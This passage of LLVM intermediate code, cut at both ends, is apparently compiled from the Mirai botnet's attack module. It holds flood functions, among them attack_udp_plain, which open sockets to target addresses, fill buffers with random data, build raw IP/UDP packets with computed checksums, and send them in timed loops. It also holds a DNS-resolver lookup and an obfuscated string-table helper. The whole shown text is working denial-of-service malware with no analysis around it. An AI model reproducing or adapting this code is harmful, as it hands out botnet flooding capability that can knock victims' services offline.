  %190 = getelementptr inbounds i8, i8* %189, i64 2
  %191 = bitcast i8* %190 to i16*
  store i16 %166, i16* %191, align 2
  %192 = getelementptr inbounds i8, i8* %190, i64 2
  %193 = bitcast i8* %192 to i16*
  store i16 %166, i16* %193, align 2
  %194 = load i32, i32* %6, align 4
  %195 = add nsw i32 %194, 1
  store i32 %195, i32* %6, align 4
  %196 = icmp slt i32 %195, %40
  br i1 %196, label %.lr.ph136.split, label %.preheader.loopexit157

; <label>:197:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %41, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %197
  br i1 %119, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %216
  %storemerge124127.us = phi i32 [ %239, %216 ], [ 0, %.lr.ph.split.us.preheader ]
  %198 = sext i32 %storemerge124127.us to i64
  %199 = getelementptr inbounds i8*, i8** %9, i64 %198
  %200 = load i8*, i8** %199, align 8
  %201 = bitcast i8* %200 to %struct.iphdr*
  %202 = getelementptr inbounds i8, i8* %200, i64 20
  %203 = getelementptr inbounds i8, i8* %200, i64 28
  %204 = getelementptr inbounds i8, i8* %200, i64 41
  %205 = getelementptr inbounds i8, i8* %200, i64 4
  %206 = bitcast i8* %205 to i16*
  store i16 0, i16* %206, align 4
  br i1 %121, label %207, label %209

; <label>:207:                                    ; preds = %.lr.ph.split.us
  %208 = bitcast i8* %202 to i16*
  store i16 0, i16* %208, align 2
  br label %209

; <label>:209:                                    ; preds = %207, %.lr.ph.split.us
  br i1 %123, label %210, label %213

; <label>:210:                                    ; preds = %209
  %211 = getelementptr inbounds i8, i8* %200, i64 22
  %212 = bitcast i8* %211 to i16*
  store i16 0, i16* %212, align 2
  br label %213

; <label>:213:                                    ; preds = %210, %209
  br i1 %125, label %214, label %216

; <label>:214:                                    ; preds = %213
  %215 = bitcast i8* %203 to i16*
  store i16 0, i16* %215, align 2
  br label %216

; <label>:216:                                    ; preds = %214, %213
  call void @rand_alphastr(i8* %204, i32 %.pre)
  %217 = getelementptr inbounds i8, i8* %204, i64 %.pre144
  store i8 0, i8* %217, align 1
  %218 = getelementptr inbounds i8, i8* %200, i64 10
  %219 = bitcast i8* %218 to i16*
  store i16 0, i16* %219, align 2
  %220 = bitcast i8* %200 to i16*
  %221 = call zeroext i16 @checksum_generic(i16* %220, i32 20)
  store i16 %221, i16* %219, align 2
  %222 = getelementptr inbounds i8, i8* %200, i64 26
  %223 = bitcast i8* %222 to i16*
  store i16 0, i16* %223, align 2
  %224 = getelementptr inbounds i8, i8* %200, i64 24
  %225 = bitcast i8* %224 to i16*
  %226 = load i16, i16* %225, align 2
  %227 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %201, i8* %202, i16 zeroext %226, i32 %127)
  store i16 %227, i16* %223, align 2
  %228 = load i32, i32* %6, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %229, i32 0, i32 2, i32 0
  store i32 %27, i32* %230, align 4
  %231 = getelementptr inbounds i8, i8* %200, i64 22
  %232 = bitcast i8* %231 to i16*
  %233 = load i16, i16* %232, align 2
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %229, i32 0, i32 1
  store i16 %233, i16* %234, align 2
  %235 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %229, i32 0
  %236 = bitcast %struct.sockaddr_in* %235 to %struct.sockaddr*
  %237 = call i64 @sendto(i32 %34, i8* %200, i64 %.pre150, i32 16384, %struct.sockaddr* %236, i32 16) #10
  %238 = load i32, i32* %6, align 4
  %239 = add nsw i32 %238, 1
  store i32 %239, i32* %6, align 4
  %240 = icmp slt i32 %239, %40
  br i1 %240, label %.lr.ph.split.us, label %._crit_edge.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %257
  %storemerge124127 = phi i32 [ %280, %257 ], [ 0, %.lr.ph.split.preheader ]
  %241 = sext i32 %storemerge124127 to i64
  %242 = getelementptr inbounds i8*, i8** %9, i64 %241
  %243 = load i8*, i8** %242, align 8
  %244 = bitcast i8* %243 to %struct.iphdr*
  %245 = getelementptr inbounds i8, i8* %243, i64 20
  %246 = getelementptr inbounds i8, i8* %243, i64 28
  %247 = getelementptr inbounds i8, i8* %243, i64 41
  br i1 %121, label %248, label %250

; <label>:248:                                    ; preds = %.lr.ph.split
  %249 = bitcast i8* %245 to i16*
  store i16 0, i16* %249, align 2
  br label %250

; <label>:250:                                    ; preds = %248, %.lr.ph.split
  br i1 %123, label %251, label %254

; <label>:251:                                    ; preds = %250
  %252 = getelementptr inbounds i8, i8* %243, i64 22
  %253 = bitcast i8* %252 to i16*
  store i16 0, i16* %253, align 2
  br label %254

; <label>:254:                                    ; preds = %251, %250
  br i1 %125, label %255, label %257

; <label>:255:                                    ; preds = %254
  %256 = bitcast i8* %246 to i16*
  store i16 0, i16* %256, align 2
  br label %257

; <label>:257:                                    ; preds = %255, %254
  call void @rand_alphastr(i8* %247, i32 %.pre)
  %258 = getelementptr inbounds i8, i8* %247, i64 %.pre144
  store i8 0, i8* %258, align 1
  %259 = getelementptr inbounds i8, i8* %243, i64 10
  %260 = bitcast i8* %259 to i16*
  store i16 0, i16* %260, align 2
  %261 = bitcast i8* %243 to i16*
  %262 = call zeroext i16 @checksum_generic(i16* %261, i32 20)
  store i16 %262, i16* %260, align 2
  %263 = getelementptr inbounds i8, i8* %243, i64 26
  %264 = bitcast i8* %263 to i16*
  store i16 0, i16* %264, align 2
  %265 = getelementptr inbounds i8, i8* %243, i64 24
  %266 = bitcast i8* %265 to i16*
  %267 = load i16, i16* %266, align 2
  %268 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %244, i8* %245, i16 zeroext %267, i32 %127)
  store i16 %268, i16* %264, align 2
  %269 = load i32, i32* %6, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %270, i32 0, i32 2, i32 0
  store i32 %27, i32* %271, align 4
  %272 = getelementptr inbounds i8, i8* %243, i64 22
  %273 = bitcast i8* %272 to i16*
  %274 = load i16, i16* %273, align 2
  %275 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %270, i32 0, i32 1
  store i16 %274, i16* %275, align 2
  %276 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %270, i32 0
  %277 = bitcast %struct.sockaddr_in* %276 to %struct.sockaddr*
  %278 = call i64 @sendto(i32 %34, i8* %243, i64 %.pre150, i32 16384, %struct.sockaddr* %277, i32 16) #10
  %279 = load i32, i32* %6, align 4
  %280 = add nsw i32 %279, 1
  store i32 %280, i32* %6, align 4
  %281 = icmp slt i32 %280, %40
  br i1 %281, label %.lr.ph.split, label %._crit_edge.loopexit156

._crit_edge.loopexit:                             ; preds = %216
  br label %._crit_edge

._crit_edge.loopexit156:                          ; preds = %257
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit156, %._crit_edge.loopexit, %197
  %282 = call i64 @time(i64* null) #10
  %283 = icmp sgt i64 %282, %128
  br i1 %283, label %.loopexit.loopexit, label %197

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %32, %5, %116
  ret void

; <label>:284:                                    ; preds = %.lr.ph133.us.1158
  %285 = add i8 %.1.us, 1
  br label %289

; <label>:286:                                    ; preds = %.lr.ph133.us.1158
  store i8 %.1.us, i8* %.1123.us, align 1
  %287 = getelementptr inbounds i8, i8* %89, i64 %indvars.iv.next
  %288 = getelementptr inbounds i8, i8* %287, i64 1
  br label %289

; <label>:289:                                    ; preds = %286, %284
  %.1123.us.1 = phi i8* [ %288, %286 ], [ %.1123.us, %284 ]
  %.1.us.1 = phi i8 [ 0, %286 ], [ %285, %284 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge134.us.loopexit.unr-lcssa, label %.lr.ph133.us

; <label>:290:                                    ; preds = %.lr.ph133.1161
  %291 = add i8 %.1, 1
  br label %295

; <label>:292:                                    ; preds = %.lr.ph133.1161
  store i8 %.1, i8* %.1123, align 1
  %293 = getelementptr inbounds i8, i8* %170, i64 %indvars.iv.next141
  %294 = getelementptr inbounds i8, i8* %293, i64 1
  br label %295

; <label>:295:                                    ; preds = %292, %290
  %.1123.1 = phi i8* [ %294, %292 ], [ %.1123, %290 ]
  %.1.1 = phi i8 [ 0, %292 ], [ %291, %290 ]
  %indvars.iv.next141.1 = add nsw i64 %indvars.iv140, 2
  %exitcond143.1 = icmp eq i64 %indvars.iv.next141.1, %wide.trip.count
  br i1 %exitcond143.1, label %._crit_edge134.loopexit.unr-lcssa, label %.lr.ph133
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_dns_resolver() unnamed_addr #0 {
  %1 = alloca [2048 x i8], align 16
  %2 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 37)
  %3 = tail call i8* @table_retrieve_val(i32 37, i32* null)
  %4 = tail call i32 (i8*, i32, ...) @open(i8* %3, i32 0) #10
  tail call void @table_lock_val(i8 zeroext 37)
  %5 = icmp sgt i32 %4, -1
  br i1 %5, label %6, label %.loopexit

; <label>:6:                                      ; preds = %0
  %7 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 0
  %8 = call i64 @read(i32 %4, i8* nonnull %7, i64 2048) #10
  %9 = trunc i64 %8 to i32
  %10 = tail call i32 @close(i32 %4) #10
  tail call void @table_unlock_val(i8 zeroext 38)
  %11 = tail call i8* @table_retrieve_val(i32 38, i32* null)
  %12 = call i32 @util_stristr(i8* nonnull %7, i32 %9, i8* %11)
  tail call void @table_lock_val(i8 zeroext 38)
  %13 = icmp ne i32 %12, -1
  %14 = icmp slt i32 %12, %9
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.loopexit

.lr.ph:                                           ; preds = %6
  %.old = add nsw i32 %9, -1
  %15 = sext i32 %12 to i64
  %sext = shl i64 %8, 32
  %16 = ashr exact i64 %sext, 32
  br label %17

; <label>:17:                                     ; preds = %.lr.ph, %35
  %indvars.iv = phi i64 [ %15, %.lr.ph ], [ %indvars.iv.next, %35 ]
  %.02633 = phi i8 [ 0, %.lr.ph ], [ %.2, %35 ]
  %18 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %indvars.iv
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %.02633, 0
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %17
  switch i8 %19, label %22 [
    i8 32, label %35
    i8 9, label %35
  ]

; <label>:22:                                     ; preds = %21, %17
  %.1 = phi i8 [ %.02633, %17 ], [ 1, %21 ]
  %23 = icmp eq i8 %19, 46
  %24 = trunc i64 %indvars.iv to i32
  br i1 %23, label %28, label %25

; <label>:25:                                     ; preds = %22
  %.off = add i8 %19, -48
  %26 = icmp ugt i8 %.off, 9
  %27 = icmp eq i32 %24, %.old
  %or.cond29 = or i1 %27, %26
  br i1 %or.cond29, label %.critedge, label %35

; <label>:28:                                     ; preds = %22
  %.old28 = icmp eq i32 %24, %.old
  br i1 %.old28, label %.critedge, label %35

.critedge:                                        ; preds = %28, %25
  %.02731.lcssa = phi i32 [ %.old, %28 ], [ %24, %25 ]
  %29 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 0
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %15
  %31 = sub nsw i32 %.02731.lcssa, %12
  call void @util_memcpy(i8* nonnull %29, i8* %30, i32 %31)
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 %32
  store i8 0, i8* %33, align 1
  %34 = call i32 @inet_addr(i8* nonnull %29) #10
  br label %38

; <label>:35:                                     ; preds = %25, %21, %21, %28
  %.2 = phi i8 [ %.1, %28 ], [ 0, %21 ], [ 0, %21 ], [ %.1, %25 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %36 = icmp slt i64 %indvars.iv.next, %16
  br i1 %36, label %17, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %35
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %6, %0
  %37 = call i32 @htonl(i32 134744072) #11
  br label %38

; <label>:38:                                     ; preds = %.loopexit, %.critedge
  %.0 = phi i32 [ %34, %.critedge ], [ %37, %.loopexit ]
  ret i32 %.0
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #6

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call noalias i8* @calloc(i64 %7, i64 4) #10
  %11 = bitcast i8* %10 to i32*
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 512)
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %17 = trunc i32 %16 to i8
  %18 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %18, i8 0, i64 16, i32 4, i1 false)
  %19 = tail call i64 @time(i64* null) #10
  %20 = zext i32 %0 to i64
  %21 = add i64 %19, %20
  %22 = and i32 %14, 65535
  %23 = icmp eq i32 %22, 65535
  br i1 %23, label %27, label %24

; <label>:24:                                     ; preds = %5
  %25 = trunc i32 %14 to i16
  %26 = tail call zeroext i16 @htons(i16 zeroext %25) #11
  br label %27

; <label>:27:                                     ; preds = %5, %24
  %.062 = phi i16 [ %26, %24 ], [ 0, %5 ]
  %28 = icmp eq i8 %1, 0
  br i1 %28, label %.preheader.thread, label %.lr.ph71

.preheader.thread:                                ; preds = %27
  %sext86 = shl i64 %21, 32
  %29 = ashr exact i64 %sext86, 32
  br label %.preheader.split.preheader

.lr.ph71:                                         ; preds = %27
  %30 = and i32 %12, 65535
  %31 = icmp eq i32 %30, 65535
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %35 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %36 = zext i8 %1 to i64
  br i1 %31, label %.lr.ph71.split.us.preheader, label %.lr.ph71.split.preheader

.lr.ph71.split.preheader:                         ; preds = %.lr.ph71
  br label %.lr.ph71.split

.lr.ph71.split.us.preheader:                      ; preds = %.lr.ph71
  br label %.lr.ph71.split.us

.lr.ph71.split.us:                                ; preds = %.lr.ph71.split.us.preheader, %55
  %indvars.iv81 = phi i64 [ %indvars.iv.next82, %55 ], [ 0, %.lr.ph71.split.us.preheader ]
  %37 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %38 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv81
  store i8* %37, i8** %38, align 8
  %39 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv81
  %40 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv81, i32 0, i32 1
  store i16 0, i16* %40, align 2
  %41 = call i32 @socket(i32 2, i32 2, i32 17) #10
  %42 = getelementptr inbounds i32, i32* %11, i64 %indvars.iv81
  store i32 %41, i32* %42, align 4
  %43 = icmp eq i32 %41, -1
  br i1 %43, label %.loopexit.loopexit99, label %44

; <label>:44:                                     ; preds = %.lr.ph71.split.us
  store i16 2, i16* %32, align 4
  store i16 %.062, i16* %33, align 2
  store i32 0, i32* %34, align 4
  %45 = call i32 @bind(i32 %41, %struct.sockaddr* nonnull %35, i32 16) #10
  %46 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv81, i32 2
  %47 = load i8, i8* %46, align 4
  %48 = icmp ult i8 %47, 32
  br i1 %48, label %49, label %55

; <label>:49:                                     ; preds = %44
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv81, i32 1
  %51 = load i32, i32* %50, align 4
  %52 = call i32 @ntohl(i32 %51) #11
  %53 = call i32 @htonl(i32 %52) #11
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv81, i32 0, i32 2, i32 0
  store i32 %53, i32* %54, align 4
  br label %55

; <label>:55:                                     ; preds = %49, %44
  %56 = bitcast %struct.attack_target* %39 to %struct.sockaddr*
  %57 = call i32 @connect(i32 %41, %struct.sockaddr* %56, i32 16) #10
  %indvars.iv.next82 = add nuw nsw i64 %indvars.iv81, 1
  %58 = icmp slt i64 %indvars.iv.next82, %36
  br i1 %58, label %.lr.ph71.split.us, label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %55
  br label %.preheader

.preheader.loopexit101:                           ; preds = %95
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit101, %.preheader.loopexit
  %59 = icmp eq i8 %17, 0
  %.mask = and i32 %15, 65535
  %60 = zext i32 %.mask to i64
  %sext = shl i64 %21, 32
  %61 = ashr exact i64 %sext, 32
  br i1 %28, label %.preheader.split.preheader, label %.preheader.split.us.preheader

.preheader.split.us.preheader:                    ; preds = %.preheader
  %wide.trip.count79 = zext i8 %1 to i64
  %wide.trip.count = zext i8 %1 to i64
  br label %.preheader.split.us

.preheader.split.preheader:                       ; preds = %.preheader.thread, %.preheader
  %62 = phi i64 [ %29, %.preheader.thread ], [ %61, %.preheader ]
  br label %.preheader.split

.preheader.split.us:                              ; preds = %.preheader.split.us.preheader, %._crit_edge.us
  br i1 %59, label %.lr.ph.split.us.us.preheader, label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader:       ; preds = %.preheader.split.us
  br label %.lr.ph..lr.ph.split_crit_edge.us

.lr.ph.split.us.us.preheader:                     ; preds = %.preheader.split.us
  br label %.lr.ph.split.us.us

.lr.ph..lr.ph.split_crit_edge.us:                 ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader, %.lr.ph..lr.ph.split_crit_edge.us
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph..lr.ph.split_crit_edge.us ], [ 0, %.lr.ph..lr.ph.split_crit_edge.us.preheader ]
  %63 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv
  %64 = load i8*, i8** %63, align 8
  call void @rand_alphastr(i8* %64, i32 %.mask)
  %65 = getelementptr inbounds i8, i8* %64, i64 %60
  store i8 0, i8* %65, align 1
  %66 = getelementptr inbounds i32, i32* %11, i64 %indvars.iv
  %67 = load i32, i32* %66, align 4
  %68 = call i64 @send(i32 %67, i8* %64, i64 %60, i32 16384) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.us.loopexit97, label %.lr.ph..lr.ph.split_crit_edge.us

._crit_edge.us.loopexit:                          ; preds = %.lr.ph.split.us.us
  br label %._crit_edge.us

._crit_edge.us.loopexit97:                        ; preds = %.lr.ph..lr.ph.split_crit_edge.us
  br label %._crit_edge.us

._crit_edge.us:                                   ; preds = %._crit_edge.us.loopexit97, %._crit_edge.us.loopexit
  %69 = call i64 @time(i64* null) #10
  %70 = icmp sgt i64 %69, %61
  br i1 %70, label %.loopexit.loopexit98, label %.preheader.split.us

.lr.ph.split.us.us:                               ; preds = %.lr.ph.split.us.us.preheader, %.lr.ph.split.us.us
  %indvars.iv77 = phi i64 [ %indvars.iv.next78, %.lr.ph.split.us.us ], [ 0, %.lr.ph.split.us.us.preheader ]
  %71 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv77
  %72 = load i8*, i8** %71, align 8
  %73 = getelementptr inbounds i32, i32* %11, i64 %indvars.iv77
  %74 = load i32, i32* %73, align 4
  %75 = call i64 @send(i32 %74, i8* %72, i64 %60, i32 16384) #10
  %indvars.iv.next78 = add nuw nsw i64 %indvars.iv77, 1
  %exitcond80 = icmp eq i64 %indvars.iv.next78, %wide.trip.count79
  br i1 %exitcond80, label %._crit_edge.us.loopexit, label %.lr.ph.split.us.us

.lr.ph71.split:                                   ; preds = %.lr.ph71.split.preheader, %95
  %indvars.iv83 = phi i64 [ %indvars.iv.next84, %95 ], [ 0, %.lr.ph71.split.preheader ]
  %76 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %77 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv83
  store i8* %76, i8** %77, align 8
  %78 = call zeroext i16 @htons(i16 zeroext %13) #11
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv83
  %80 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv83, i32 0, i32 1
  store i16 %78, i16* %80, align 2
  %81 = call i32 @socket(i32 2, i32 2, i32 17) #10
  %82 = getelementptr inbounds i32, i32* %11, i64 %indvars.iv83
  store i32 %81, i32* %82, align 4
  %83 = icmp eq i32 %81, -1
  br i1 %83, label %.loopexit.loopexit100, label %84

; <label>:84:                                     ; preds = %.lr.ph71.split
  store i16 2, i16* %32, align 4
  store i16 %.062, i16* %33, align 2
  store i32 0, i32* %34, align 4
  %85 = call i32 @bind(i32 %81, %struct.sockaddr* nonnull %35, i32 16) #10
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv83, i32 2
  %87 = load i8, i8* %86, align 4
  %88 = icmp ult i8 %87, 32
  br i1 %88, label %89, label %95

; <label>:89:                                     ; preds = %84
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv83, i32 1
  %91 = load i32, i32* %90, align 4
  %92 = call i32 @ntohl(i32 %91) #11
  %93 = call i32 @htonl(i32 %92) #11
  %94 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv83, i32 0, i32 2, i32 0
  store i32 %93, i32* %94, align 4
  br label %95

; <label>:95:                                     ; preds = %89, %84
  %96 = bitcast %struct.attack_target* %79 to %struct.sockaddr*
  %97 = call i32 @connect(i32 %81, %struct.sockaddr* %96, i32 16) #10
  %indvars.iv.next84 = add nuw nsw i64 %indvars.iv83, 1
  %98 = icmp slt i64 %indvars.iv.next84, %36
  br i1 %98, label %.lr.ph71.split, label %.preheader.loopexit101

.preheader.split:                                 ; preds = %.preheader.split.preheader, %.preheader.split
  %99 = call i64 @time(i64* null) #10
  %100 = icmp sgt i64 %99, %62
  br i1 %100, label %.loopexit.loopexit, label %.preheader.split

.loopexit.loopexit:                               ; preds = %.preheader.split
  br label %.loopexit

.loopexit.loopexit98:                             ; preds = %._crit_edge.us
  br label %.loopexit

.loopexit.loopexit99:                             ; preds = %.lr.ph71.split.us
  br label %.loopexit

.loopexit.loopexit100:                            ; preds = %.lr.ph71.split
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit100, %.loopexit.loopexit99, %.loopexit.loopexit98, %.loopexit.loopexit
  ret void
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @checksum_generic(i16* nocapture readonly, i32) local_unnamed_addr #4 {
  %3 = icmp ugt i32 %1, 1
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv27 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv27, 4
  br i1 %min.iters.check, label %.lr.ph.preheader28, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %8 = zext i32 %addconv27 to i64
  %9 = and i32 %addconv27, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end21 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph.preheader28, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi22 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load25 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load25 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi22
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !3

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx26 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx26, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge.loopexit, label %.lr.ph.preheader28

.lr.ph.preheader28:                               ; preds = %middle.block, %min.iters.checked, %.lr.ph.preheader
  %.015.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph.preheader ], [ %19, %middle.block ]
  %.01114.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph.preheader ], [ %ind.end, %middle.block ]
  %.01213.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph.preheader ], [ %ind.end21, %middle.block ]
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader28, %.lr.ph
  %.015 = phi i64 [ %23, %.lr.ph ], [ %.015.ph, %.lr.ph.preheader28 ]
  %.01114 = phi i32 [ %24, %.lr.ph ], [ %.01114.ph, %.lr.ph.preheader28 ]
  %.01213 = phi i16* [ %20, %.lr.ph ], [ %.01213.ph, %.lr.ph.preheader28 ]
  %20 = getelementptr inbounds i16, i16* %.01213, i64 1
  %21 = load i16, i16* %.01213, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.015
  %24 = add i32 %.01114, -2
  %25 = icmp ugt i32 %24, 1
  br i1 %25, label %.lr.ph, label %._crit_edge.loopexit.loopexit, !llvm.loop !6

._crit_edge.loopexit.loopexit:                    ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %._crit_edge.loopexit.loopexit, %middle.block
  %.lcssa = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  %.012.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge.loopexit ]
  %.011.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa, %._crit_edge.loopexit ]
  %27 = icmp eq i32 %.011.lcssa, 1
  br i1 %27, label %28, label %33

; <label>:28:                                     ; preds = %._crit_edge
  %29 = load i16, i16* %.012.lcssa, align 2
  %30 = zext i16 %29 to i64
  %sext = shl i64 %30, 56
  %31 = ashr exact i64 %sext, 56
  %32 = add i64 %31, %.0.lcssa
  br label %33

; <label>:33:                                     ; preds = %28, %._crit_edge
  %.1 = phi i64 [ %32, %28 ], [ %.0.lcssa, %._crit_edge ]
  %34 = lshr i64 %.1, 16
  %35 = and i64 %.1, 65535
  %36 = add nuw nsw i64 %34, %35
  %37 = lshr i64 %36, 16
  %38 = add nuw nsw i64 %37, %36
  %39 = trunc i64 %38 to i16
  %40 = xor i16 %39, -1
  ret i16 %40
}

; Function Attrs: noinline nounwind readonly uwtable
